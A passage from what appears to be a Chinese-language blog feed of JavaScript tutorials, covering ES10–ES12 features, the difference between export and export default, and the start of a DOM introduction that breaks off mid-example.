title="31、Object.fromEntries"></a>31、Object.fromEntries</h3><p>前面ES8的<code>Object.entries</code>是把<code>对象转成键值对数组</code>，而<code>Object.fromEntries</code>则相反，是把<code>键值对数组转为对象</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [</span><br><span class="line">  [<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;林三心&#x27;</span>],</span><br><span class="line">  [<span class="string">&#x27;age&#x27;</span>, <span class="number">22</span>],</span><br><span class="line">  [<span class="string">&#x27;gender&#x27;</span>, <span class="string">&#x27;男&#x27;</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.fromEntries(arr)) <span class="comment">// &#123; name: &#x27;林三心&#x27;, age: 22, gender: &#x27;男&#x27; &#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>他还有一个用处，就是把<code>Map转为对象</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">map.set(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;林三心&#x27;</span>)</span><br><span class="line">map.set(<span class="string">&#x27;age&#x27;</span>, <span class="number">22</span>)</span><br><span class="line">map.set(<span class="string">&#x27;gender&#x27;</span>, <span class="string">&#x27;男&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(map) <span class="comment">// Map(3) &#123; &#x27;name&#x27; =&gt; &#x27;林三心&#x27;, &#x27;age&#x27; =&gt; 22, &#x27;gender&#x27; =&gt; &#x27;男&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = <span class="built_in">Object</span>.fromEntries(map)</span><br><span class="line"><span class="built_in">console</span>.log(obj) <span class="comment">// &#123; name: &#x27;林三心&#x27;, age: 22, gender: &#x27;男&#x27; &#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="32、String-trimStart-amp-amp-String-trimEnd"><a href="#32、String-trimStart-amp-amp-String-trimEnd" class="headerlink" title="32、String.trimStart &amp;&amp; String.trimEnd"></a>32、String.trimStart &amp;&amp; String.trimEnd</h3><p>咱们都知道JavaScript有个trim方法，可以清除字符串首尾的空格</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">&#x27;    林三心    &#x27;</span></span><br><span class="line"><span class="built_in">console</span>.log(str.trim()) <span class="comment">// &#x27;林三心&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>trimStart和trimEnd用来单独去除字符串的首和尾的空格</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">&#x27;    林三心    &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 去除首部空格</span></span><br><span class="line"><span class="built_in">console</span>.log(str.trimStart()) <span class="comment">// &#x27;林三心   &#x27;</span></span><br><span class="line"><span class="comment">// 去除尾部空格</span></span><br><span class="line"><span class="built_in">console</span>.log(str.trimStart()) <span class="comment">// &#x27;   林三心&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ES11"><a href="#ES11" class="headerlink" title="ES11"></a>ES11</h2><h3 id="33、Promise-allSettled"><a href="#33、Promise-allSettled" class="headerlink" title="33、Promise.allSettled"></a>33、Promise.allSettled</h3><p>ES11新增的Promise的方法</p><ul><li>接收一个Promise数组，数组中如有非Promise项，则此项当做成功</li><li>把每一个Promise的结果，集合成数组，返回</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">time, isResolve</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      isResolve ? resolve(<span class="string">`<span class="subst">$&#123;time&#125;</span>毫秒后我成功啦！！！`</span>) : reject(<span class="string">`<span class="subst">$&#123;time&#125;</span>毫秒后我失败啦！！！`</span>)</span><br><span class="line">    &#125;, time)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.allSettled([fn(<span class="number">2000</span>, <span class="literal">true</span>), fn(<span class="number">3000</span>), fn(<span class="number">1000</span>)]).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res)</span><br><span class="line">  <span class="comment">// 3秒后输出 </span></span><br><span class="line">  [</span><br><span class="line">  &#123; <span class="attr">status</span>: <span class="string">&#x27;fulfilled&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;2000毫秒后我成功啦！！！&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">status</span>: <span class="string">&#x27;rejected&#x27;</span>, <span class="attr">reason</span>: <span class="string">&#x27;3000毫秒后我失败啦！！！&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">status</span>: <span class="string">&#x27;rejected&#x27;</span>, <span class="attr">reason</span>: <span class="string">&#x27;1000毫秒后我失败啦！！！&#x27;</span> &#125;</span><br><span class="line">]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="34、-和"><a href="#34、-和" class="headerlink" title="34、?. 和 ??"></a>34、?. 和 ??</h3><ul><li>先说说<code>?.</code>，中文名为<code>可选链</code></li></ul><p>比如我们需要一个变量，是数组且有长度，才做某些操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> list = <span class="literal">null</span></span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line"><span class="keyword">if</span> (list &amp;&amp; list.length) &#123;</span><br><span class="line">  <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用可选链</span></span><br><span class="line"><span class="keyword">const</span> list = <span class="literal">null</span></span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line"><span class="keyword">if</span> (list?.length) &#123;</span><br><span class="line">  <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比如有一个对象，我要取一个可能不存在的值，甚至我们都不确定obj是否存在</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  cat: &#123;</span><br><span class="line">    name: <span class="string">&#x27;哈哈&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> dog = obj &amp;&amp; obj.dog &amp;&amp; obj.dog.name <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选链</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  cat: &#123;</span><br><span class="line">    name: <span class="string">&#x27;哈哈&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> dog = obj?.dog?.name <span class="comment">// undefined</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比如有一个数组，我不确定它存不存在，存在的话就取索引为1的值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = <span class="literal">null</span></span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line"><span class="keyword">const</span> item = arr &amp;&amp; arr[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选链</span></span><br><span class="line"><span class="keyword">const</span> arr = <span class="literal">null</span></span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line"><span class="keyword">const</span> item = arr?.[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>比如有一个函数，我们不确定它存不存在，存在的话就执行它</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fn = <span class="literal">null</span></span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line"><span class="keyword">const</span> res = fn &amp;&amp; fn()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选链</span></span><br><span class="line"><span class="keyword">const</span> fn = <span class="literal">null</span></span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line"><span class="keyword">const</span> res = fn?.()</span><br></pre></td></tr></table></figure><ul><li>再说说<code>??</code>，中文名为<code>空位合并运算符</code></li></ul><p>请看以下代码，咱们使用<code>||</code>运算符，只要左边是<code>假值</code>，就会返回右边的数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="number">0</span> || <span class="string">&#x27;林三心&#x27;</span> <span class="comment">// 林三心</span></span><br><span class="line"><span class="keyword">const</span> b = <span class="string">&#x27;&#x27;</span> || <span class="string">&#x27;林三心&#x27;</span> <span class="comment">// 林三心</span></span><br><span class="line"><span class="keyword">const</span> c = <span class="literal">false</span> || <span class="string">&#x27;林三心&#x27;</span> <span class="comment">// 林三心</span></span><br><span class="line"><span class="keyword">const</span> d = <span class="literal">undefined</span> || <span class="string">&#x27;林三心&#x27;</span> <span class="comment">// 林三心</span></span><br><span class="line"><span class="keyword">const</span> e = <span class="literal">null</span> || <span class="string">&#x27;林三心&#x27;</span> <span class="comment">// 林三心</span></span><br></pre></td></tr></table></figure><p>而<code>??</code>和<code>||</code>最大的区别是，在<code>??</code>这，只有<code>undefined和null</code>才算假值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="number">0</span> ?? <span class="string">&#x27;林三心&#x27;</span> <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">const</span> b = <span class="string">&#x27;&#x27;</span> ?? <span class="string">&#x27;林三心&#x27;</span> <span class="comment">// &#x27;&#x27;</span></span><br><span class="line"><span class="keyword">const</span> c = <span class="literal">false</span> ?? <span class="string">&#x27;林三心&#x27;</span> <span class="comment">// false</span></span><br><span class="line"><span class="keyword">const</span> d = <span class="literal">undefined</span> ?? <span class="string">&#x27;林三心&#x27;</span> <span class="comment">// 林三心</span></span><br><span class="line"><span class="keyword">const</span> e = <span class="literal">null</span> ?? <span class="string">&#x27;林三心&#x27;</span> <span class="comment">// 林三心</span></span><br></pre></td></tr></table></figure><h2 id="ES12"><a href="#ES12" class="headerlink" title="ES12"></a>ES12</h2><h3 id="35、Promise-any"><a href="#35、Promise-any" class="headerlink" title="35、Promise.any"></a>35、Promise.any</h3><p>E12新增的Promise的方法</p><ul><li>接收一个Promise数组，数组中如有非Promise项，则此项当做成功</li><li>如果有一个Promise成功，则返回这个成功结果</li><li>如果所有Promise都失败，则报错</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当有成功的时候，返回最快那个成功</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">time, isResolve</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      isResolve ? resolve(<span class="string">`<span class="subst">$&#123;time&#125;</span>毫秒后我成功啦！！！`</span>) : reject(<span class="string">`<span class="subst">$&#123;time&#125;</span>毫秒后我失败啦！！！`</span>)</span><br><span class="line">    &#125;, time)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.any([fn(<span class="number">2000</span>, <span class="literal">true</span>), fn(<span class="number">3000</span>), fn(<span class="number">1000</span>, <span class="literal">true</span>)]).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res) <span class="comment">// 1秒后 输出  1000毫秒后我成功啦</span></span><br><span class="line">&#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当全都失败时</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">time, isResolve</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      isResolve ? resolve(<span class="string">`<span class="subst">$&#123;time&#125;</span>毫秒后我成功啦！！！`</span>) : reject(<span class="string">`<span class="subst">$&#123;time&#125;</span>毫秒后我失败啦！！！`</span>)</span><br><span class="line">    &#125;, time)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.any([fn(<span class="number">2000</span>), fn(<span class="number">3000</span>), fn(<span class="number">1000</span>)]).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err) <span class="comment">// 3秒后 报错 all Error</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="36、数字分隔符"><a href="#36、数字分隔符" class="headerlink" title="36、数字分隔符"></a>36、数字分隔符</h3><p>数字分隔符可以让你在定义长数字时，更加地一目了然</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> num = <span class="number">1000000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用数字分隔符</span></span><br><span class="line"><span class="keyword">const</span> num = <span class="number">1_000_000_000</span></span><br></pre></td></tr></table></figure><h3 id="37、-和-amp-amp"><a href="#37、-和-amp-amp" class="headerlink" title="37、||= 和 &amp;&amp;="></a>37、||= 和 &amp;&amp;=</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">或等于(||=)   a ||= b 等同于 a || (a = b);</span><br><span class="line"></span><br><span class="line">且等于(&amp;&amp;=)   a &amp;&amp;= b 等同于 a &amp;&amp; (a = b);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>export和export default的区别</title>
    <link href="http://aiolimp.com/2021/07/28/export%E5%92%8Cexport%20default%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <id>http://aiolimp.com/2021/07/28/export%E5%92%8Cexport%20default%E7%9A%84%E5%8C%BA%E5%88%AB/</id>
    <published>2021-07-28T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.211Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="export和export-default的区别"><a href="#export和export-default的区别" class="headerlink" title="export和export default的区别"></a>export和export default的区别</h1><h3 id="export命令用于规定模块的对外接口。"><a href="#export命令用于规定模块的对外接口。" class="headerlink" title="export命令用于规定模块的对外接口。"></a><strong><code>export</code>命令用于规定模块的对外接口。</strong></h3><p>一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取。如果你希望外部能够读取模块内部的某个变量，就必须使用<code>export</code>关键字输出该变量。下面是一个 JS 文件，里面使用<code>export</code>命令输出变量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// profile.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> firstName = <span class="string">&#x27;Michael&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> lastName = <span class="string">&#x27;Jackson&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> year = <span class="number">1958</span>;</span><br></pre></td></tr></table></figure><p>上面代码是<code>profile.js</code>文件，保存了用户信息。ES6 将其视为一个模块，里面用<code>export</code>命令对外部输出了三个变量。</p><p><code>export</code>的写法，除了像上面这样，还有另外一种。</p><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// profile.js</span></span><br><span class="line"><span class="keyword">var</span> firstName = <span class="string">&#x27;Michael&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> lastName = <span class="string">&#x27;Jackson&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> year = <span class="number">1958</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;firstName, lastName, year&#125;;</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p><p>上面代码在<code>export</code>命令后面，使用大括号指定所要输出的一组变量。它与前一种写法（直接放置在<code>var</code>语句前）是等价的，但是应该优先考虑使用这种写法。因为这样就可以在脚本尾部，一眼看清楚输出了哪些变量。</p><p><code>export</code>命令除了输出变量，还可以输出函数或类（class）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">multiply</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x * y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面代码对外输出一个函数<code>multiply</code>。</p><p><code>export</code>命令对外输出了指定名字的变量（变量也可以是函数或类）。</p><p>与export default命令的区别：<code>import</code>命令接受一对大括号，里面指定要从其他模块导入的变量名。大括号里面的变量名，必须与被导入模块（<code>profile.js</code>）对外接口的名称相同。</p><p>如果想为输入的变量重新取一个名字，<code>import</code>命令要使用<code>as</code>关键字，将输入的变量重命名。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; lastName <span class="keyword">as</span> surname &#125; <span class="keyword">from</span> <span class="string">&#x27;./profile.js&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="export-default命令，为模块指定默认输出。"><a href="#export-default命令，为模块指定默认输出。" class="headerlink" title="export default命令，为模块指定默认输出。"></a><strong><code>export default</code>命令，为模块指定默认输出。</strong></h3><p>使用<code>import</code>命令的时候，用户需要知道所要加载的变量名或函数名，否则无法加载。但是，用户肯定希望快速上手，未必愿意阅读文档，去了解模块有哪些属性和方法。</p><p>为了给用户提供方便，让他们不用阅读文档就能加载模块，就要用到<code>export default</code>命令，为模块指定默认输出。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// export-default.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码是一个模块文件<code>export-default.js</code>，它的默认输出是一个函数。</p><p>与export命令的区别：其他模块加载该模块时，<code>import</code>命令可以为该匿名函数指定任意名字。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// import-default.js</span></span><br><span class="line"><span class="keyword">import</span> customName <span class="keyword">from</span> <span class="string">&#x27;./export-default&#x27;</span>;</span><br><span class="line">customName(); <span class="comment">// &#x27;foo&#x27;</span></span><br></pre></td></tr></table></figure><p>上面代码的<code>import</code>命令，可以用任意名称指向<code>export-default.js</code>输出的方法，这时就不需要知道原模块输出的函数名。需要注意的是，这时<code>import</code>命令后面，不使用大括号。</p><p>本质上，<code>export default</code>就是输出一个叫做<code>default</code>的变量或方法，然后系统允许你为它取任意名字。所以，下面的写法是有效的。</p><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// modules.js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x * y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> &#123;add <span class="keyword">as</span> <span class="keyword">default</span>&#125;;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="comment">// export default add;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="keyword">default</span> <span class="keyword">as</span> foo &#125; <span class="keyword">from</span> <span class="string">&#x27;modules&#x27;</span>;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="comment">// import foo from &#x27;modules&#x27;;</span></span><br></pre></td></tr></table></figure><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p><p>正是因为<code>export default</code>命令其实只是输出一个叫做<code>default</code>的变量，所以它后面不能跟变量声明语句。</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><strong>总结：</strong></h3><p>export命令对外接口是有名称的且<code>import</code>命令从模块导入的变量名与被导入模块对外接口的名称相同，而export default命令对外输出的变量名可以是任意的，这时<code>import</code>命令后面，不使用大括号。</p><p><code>export default</code>命令用于指定模块的默认输出。显然，一个模块只能有一个默认输出，因此<code>export default</code>命令只能使用一次。所以，import命令后面才不用加大括号，因为只可能唯一对应<code>export default</code>命令。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>DOM简介和DOM操作</title>
    <link href="http://aiolimp.com/2021/07/26/DOM%E7%AE%80%E4%BB%8B%E5%92%8CDOM%E6%93%8D%E4%BD%9C/"/>
    <id>http://aiolimp.com/2021/07/26/DOM%E7%AE%80%E4%BB%8B%E5%92%8CDOM%E6%93%8D%E4%BD%9C/</id>
    <published>2021-07-26T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.204Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="DOM简介和DOM操作"><a href="#DOM简介和DOM操作" class="headerlink" title="DOM简介和DOM操作"></a>DOM简介和DOM操作</h1><h3 id="JavaScript的组成"><a href="#JavaScript的组成" class="headerlink" title="JavaScript的组成"></a><strong>JavaScript的组成</strong></h3><ul><li>ECMAScript：JavaScript的语法标准，包括变量、表达式、运算符、函数、if语句、for语句等等。</li><li><strong>DOM</strong>：文档对象模型(Document object Model)，操作网页上的元素的API，比如让盒子移动、变色、轮播图等。</li><li><strong>BOM</strong>：浏览器对象模型，操作浏览器部分功能的API，比如让浏览器自动滚动。</li></ul><h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a><strong>节点</strong></h3><p>节点(Node):构成HTML网页的最基本单元，网页中的每一个部分都可以称为是一个节点，比如：html标签、属性、文本、注释等都是一个节点。常用节点分为四大类：</p><ul><li>文档节点(文档)：整个HTML文档就是一个文档节点。</li><li>元素节点(标签):HTML标签。</li><li>属性节点(属性)：元素的属性。</li><li>文本节点(文本):HTML标签中的文本内容（包括标签之间的空格、换行）。<br>节点的类型不同，属性和方法也都不同，所有的节点都是Object。<br><strong>什么是DOM</strong><br>DOM：Document Object Model，文档对象模型。DOM为文档提供了结构化表示，并定义了如何通过脚本来访问文档结构。目的其实就是为了能让js操作html元素而制定的一个规范。<br>DOM由节点组成。<br><strong>解析过程</strong>：HTML加载完毕，渲染引擎会在内存中吧HTML文档，生成一个DOM树，getElementById是获取DOM上的元素节点，然后操作的时候修改的是改元素的属性。<br><strong>DOM树：</strong>(一切都是节点)<br>结构如下：<br><img src="https://img-blog.csdnimg.cn/20200831232426959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>DOM元素可以做什么</strong></li><li>找对象(元素节点)</li><li>设置元素的属性值</li><li>设置元素的样式</li><li>动态创建和删除元素</li><li>事件的触发响应：事件源、事件、事件的驱动程序</li></ul><p><strong>1.元素节点的获取</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 